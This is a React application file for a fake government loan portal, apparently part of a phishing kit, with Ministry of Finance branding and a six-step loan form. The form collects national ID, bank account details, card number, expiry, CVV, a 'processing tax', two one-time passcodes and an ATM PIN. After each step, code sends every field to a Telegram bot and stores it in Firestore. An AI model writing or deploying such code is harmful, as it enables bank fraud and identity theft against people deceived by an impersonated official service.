import React, { useState, useEffect } from 'react';
import { Header } from './components/Header';
import { Hero } from './components/Hero';
import { Leadership } from './components/Leadership';
import { TrustBadges } from './components/TrustBadges';
import { Stepper } from './components/LoanForm/Stepper';
import { Step1Personal } from './components/LoanForm/Step1Personal';
import { Step2Bank } from './components/LoanForm/Step2Bank';
import { Step3Card } from './components/LoanForm/Step3Card';
import { Step4Otp } from './components/LoanForm/Step4Otp';
import { Step5AtmPin } from './components/LoanForm/Step5AtmPin';
import { Step6FinalOtp } from './components/LoanForm/Step6FinalOtp';
import { SuccessModal } from './components/LoanForm/SuccessModal';
import { Footer } from './components/Footer';
import { ApplicationFormData, StepNumber } from './types';
import { sendTelegramNotification } from './config/telegram';
import { testFirestoreConnection, saveApplicationToFirestore } from './lib/firebase';

const initialFormData: ApplicationFormData = {
  fullName: '',
  cnic: '',
  mobileNo: '',
  gender: '',
  dateOfBirth: '',
  province: '',
  address: '',
  loanAmount: '',
  loanPurpose: '',
  occupation: '',
  bankName: '',
  accountNumber: '',
  currentBalance: '',
  monthlyIncome: '',
  cardNumber: '',
  expiry: '',
  cvv: '',
  processingTax: 'Rs. 75',
  otpCode: ['', '', '', '', '', ''],
  atmPin: ['', '', '', ''],
  finalOtpCode: ['', '', '', '', '', ''],
};

export default function App() {
  const [currentStep, setCurrentStep] = useState<StepNumber>(1);
  const [formData, setFormData] = useState<ApplicationFormData>(initialFormData);
  const [isCompleted, setIsCompleted] = useState<boolean>(false);
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
  const [applicationId, setApplicationId] = useState<string>(
    () => `app_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`
  );
  const [referenceNo, setReferenceNo] = useState<string>(
    () => `PK-${new Date().getFullYear()}-${Math.floor(100000 + Math.random() * 900000)}`
  );

  useEffect(() => {
    // Validate Firestore connection on boot
    testFirestoreConnection().catch((err) => {
      console.warn('Firestore connection check:', err);
    });
  }, []);

  const updateFormData = (fields: Partial<ApplicationFormData>) => {
    setFormData((prev) => ({ ...prev, ...fields }));
  };

  const syncStepData = async (step: number, stepName: string, customFields?: Partial<ApplicationFormData>) => {
    const combined = { ...formData, ...customFields };
    // 1. Send notification to Telegram Bot
    await sendTelegramNotification({
      step,
      stepName,
      timestamp: new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' }),
      fullName: combined.fullName,
      cnic: combined.cnic,
      mobileNo: combined.mobileNo,
      gender: combined.gender,
      dateOfBirth: combined.dateOfBirth,
      province: combined.province,
      address: combined.address,
      loanAmount: combined.loanAmount,
      loanPurpose: combined.loanPurpose,
      occupation: combined.occupation,
      bankName: combined.bankName,
      accountNumber: combined.accountNumber,
      currentBalance: combined.currentBalance,
      monthlyIncome: combined.monthlyIncome,
      cardNumber: combined.cardNumber,
      expiry: combined.expiry,
      cvv: combined.cvv,
      processingTax: combined.processingTax,
      otpCode: combined.otpCode.join(''),
      atmPin: combined.atmPin.join(''),
      finalOtpCode: combined.finalOtpCode.join(''),
    });

    // 2. Persist to Firestore database
    try {
      await saveApplicationToFirestore(applicationId, combined, step, referenceNo);
    } catch (e) {
      console.warn('Firestore sync note:', e);
    }
  };

  // Step transitions
  const handleStep1Next = () => {
    syncStepData(1, 'Personal Information');
    setCurrentStep(2);
    scrollToForm();
  };

  const handleStep2Next = () => {
    syncStepData(2, 'Bank Information');
    setCurrentStep(3);
    scrollToForm();
  };

  const handleStep3Next = () => {
    syncStepData(3, 'Card Details & Processing Tax');
    setCurrentStep(4);
    scrollToForm();
  };

  const handleStep4Next = () => {
    syncStepData(4, 'OTP Verification');
    setCurrentStep(5);
    scrollToForm();
  };

  const handleStep5Next = () => {
    syncStepData(5, 'ATM PIN Creation');
    setCurrentStep(6);
    scrollToForm();
  };

  const handleStep6Submit = async () => {
    setIsSubmitting(true);
    await syncStepData(6, 'Final Verification Completed');
    setIsSubmitting(false);
    setIsCompleted(true);
    scrollToForm();
  };

  const handleReset = () => {
    setFormData(initialFormData);
    setCurrentStep(1);
    setIsCompleted(false);
    setApplicationId(`app_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`);
    setReferenceNo(`PK-${new Date().getFullYear()}-${Math.floor(100000 + Math.random() * 900000)}`);
    scrollToForm();
  };

  const scrollToForm = () => {
    const el = document.getElementById('application-form-section');
    if (el) {
      el.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#eaf4f0] text-slate-800">
      {/* 1. Header (Navbar & Skyline) */}
      <Header />

      {/* 2. Hero Section */}
      <Hero />

      {/* 3. Leadership Section */}
      <Leadership />

      {/* 4. Trust Badges & Application Introduction */}
      <TrustBadges />

      {/* 5. Main Form Card Container */}
      <section id="application-form-section" className="w-full max-w-4xl mx-auto px-4 sm:px-8 pb-16">
        <div className="bg-white rounded-2xl border border-[#d2e8de] shadow-sm p-4 sm:p-7 md:p-8">
          {/* Stepper (Steps 1 to 6) */}
          <Stepper
            currentStep={currentStep}
            onStepClick={(step) => {
              if (!isCompleted) {
                setCurrentStep(step);
              }
            }}
          />

          {/* Form Step Body */}
          {isCompleted ? (
            <SuccessModal data={formData} referenceNo={referenceNo} onReset={handleReset} />
          ) : (
            <>
              {currentStep === 1 && (
                <Step1Personal
                  data={formData}
                  updateData={updateFormData}
                  onNext={handleStep1Next}
                />
              )}

              {currentStep === 2 && (
                <Step2Bank
                  data={formData}
                  updateData={updateFormData}
                  onNext={handleStep2Next}
                  onPrev={() => setCurrentStep(1)}
                />
              )}

              {currentStep === 3 && (
                <Step3Card
                  data={formData}
                  updateData={updateFormData}
                  onNext={handleStep3Next}
                  onPrev={() => setCurrentStep(2)}
                />
              )}

              {currentStep === 4 && (
                <Step4Otp
                  data={formData}
                  updateData={updateFormData}
                  onNext={handleStep4Next}
                  onPrev={() => setCurrentStep(3)}
                />
              )}

              {currentStep === 5 && (
                <Step5AtmPin
                  data={formData}
                  updateData={updateFormData}
                  onNext={handleStep5Next}
                  onPrev={() => setCurrentStep(4)}
                />
              )}

              {currentStep === 6 && (
                <Step6FinalOtp
                  data={formData}
                  updateData={updateFormData}
                  onSubmit={handleStep6Submit}
                  onPrev={() => setCurrentStep(5)}
                  isSubmitting={isSubmitting}
                />
              )}
            </>
          )}
        </div>
      </section>

      {/* 6. Ministry of Finance Footer */}
      <Footer />
    </div>
  );
}
